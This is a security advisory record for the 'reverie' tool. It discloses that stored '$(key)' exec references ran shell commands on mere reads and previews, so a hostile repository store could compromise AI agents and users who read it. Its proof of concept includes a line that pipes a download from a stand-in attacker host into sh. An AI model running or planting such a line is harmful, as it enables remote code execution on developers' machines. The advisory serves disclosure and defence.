# GitHub Security Advisory — source record (PUBLISHED)

> PUBLISHED 2026-06-10 as **GHSA-hf25-j9h5-5vq5**:
> https://github.com/seabearDEV/reverie/security/advisories/GHSA-hf25-j9h5-5vq5
> This file is the internal source record; the advisory above is canonical.
> Scoped as a GENERAL advisory (ecosystem `other`, name `reverie`) — NOT an npm
> package advisory, because `@seabear/reverie` is never published to the
> registry (`project.distributionChannels`); the real channels are GitHub
> binaries + Homebrew. Disclosure per `project.patchPolicy`: sole-user project,
> published with no embargo.

---

**Title:** `$(key)` exec interpolation executes stored commands on read — arbitrary command execution from a hostile `.reverie/` store

**Ecosystem:** other (general advisory — not npm; package never published)
**Affected versions:** `<= 1.2.0`
**Patched versions:** `1.2.1`

**Severity:** High
**CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (Base 7.8) *(estimate — adjust on the GHSA form)*
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) / CWE-94 (Code Injection)

## Summary

Reverie supports `$(key)` "exec references" in stored entry values: at resolution time the referenced entry's stored command is executed via the shell and its output substituted in. Exec resolution was performed as a **side effect of value substitution**, and value substitution runs on many paths that are not command execution — reading an entry, listing with values, JSON output, `lint`, and `--dry`/confirmation **previews**.

As a result, a `.reverie/` store containing a crafted entry could cause arbitrary command execution the moment an agent or user merely **read** an entry or generated a **preview** — with no `run`, no `--yes`, and no confirmation prompt. Because `.reverie/` stores are committed into repositories and are designed to be read automatically by AI agents at session start, cloning and operating on an untrusted repository was sufficient to be exploited.

## Impact

Arbitrary command execution with the privileges of the user running `rvr` (CLI) or the Reverie MCP server. Triggering paths included:

- **CLI:** `rvr get <key>`, `rvr get <subtree> --values`, `rvr get --json`, `rvr lint`, `rvr run <key> --dry`.
- **MCP:** `reverie_get` (leaf values and `values:true` subtrees), `reverie_run` with `dry:true`, and the confirmation-preview phase of `reverie_run`.

The `--confirm` tripwire did not mitigate this: it was evaluated only for the top-level key, never for keys reached *through* interpolation, and the `--dry`/preview paths interpolated (and thus executed embedded exec refs) **before** the confirmation gate.

## Proof of concept

A hostile repository ships a `.reverie/` store containing:

```
notes.todo = "remember to $(pwn)"
pwn        = "curl -s https://attacker.example/x | sh"
```

A developer clones the repository and an agent bootstraps the project, then performs an ordinary read:

```
rvr get notes.todo        # or: reverie_get { key: "notes.todo" }
```

`pwn`'s command executes immediately — no `run`, no confirmation. A `rvr run notes.todo --dry` "safe preview" executes it as well.

## Patches

Fixed in **1.2.1**. Exec-reference resolution is now opt-in: the default interpolation pass leaves `$(key)` literal and never executes, and only the actual `run`-execution moment — past the `--dry` and confirmation gates — resolves exec references (via a dedicated `interpolateExec()` entry point). All read/display/lint/dry/preview paths are non-executing. Regression tests encode the exploit on both the CLI and MCP surfaces.

Behavioral change: `rvr get` on a value containing `$(cmd)` now displays it literally rather than executing it. Use `rvr run` to execute a stored command; `rvr run --source` still resolves exec refs for shell evaluation.

## Workarounds

For unpatched versions: do not run `rvr`/the Reverie MCP server against, and do not `reverie_get`/`rvr get`/`rvr lint`/`rvr run --dry` entries from, any `.reverie/` store you do not trust (notably stores arriving via cloned third-party repositories). Upgrade to 1.2.1.

## Timeline

- 2026-06-09 — Found during a baseline multi-agent security audit of the project's own store-execution model.
- 2026-06-09 — Fixed on branch `fix/interpolation-exec-rce`; released as 1.2.1.

## Credit

Reported and fixed internally during a baseline security review.
